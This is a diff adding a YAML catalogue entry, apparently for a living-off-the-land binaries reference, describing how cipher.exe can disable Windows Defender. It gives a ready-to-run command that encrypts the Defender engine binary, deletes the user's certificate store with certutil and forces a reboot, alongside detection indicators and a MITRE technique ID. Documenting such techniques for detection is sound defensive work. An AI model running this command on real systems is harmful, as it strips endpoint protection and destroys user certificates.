@@ -1,0 +1,25 @@
+---
+Name: Cipher.exe
+Description: Security Tool for the Windows Encrypting File System
+Author: Alexander Sennhauser
+Created: 2023-01-09
+Commands:
+  - Command: cipher.exe /e "C:\ProgramData\Microsoft\Windows Defender\Platform\*\MsMpEng.exe" & certutil.exe -delstore -user my %username% & shutdown.exe /r /t 0
+    Description: Encrypt the Windows Defender binary to disable the service after a system restart.
+    Usecase: MSFT Defender bypass using LOLBINs
+    Category: Tamper
+    Privileges: Admin
+    MitreID: T1562
+    OperatingSystem: Windows 10 All
+Full_Path:
+  - Path: c:\windows\system32\cipher.exe
+Code_Sample:
+  - Code:
+Detection:
+  - IOC: cipher.exe spawned with unusual path arguments
+  - IOC: certutil.exe spawned to delete user certificates
+Resources:
+  - Link:
+Acknowledgement:
+  - Person: Alexander Sennhauser
+    Handle: '@conitrade'
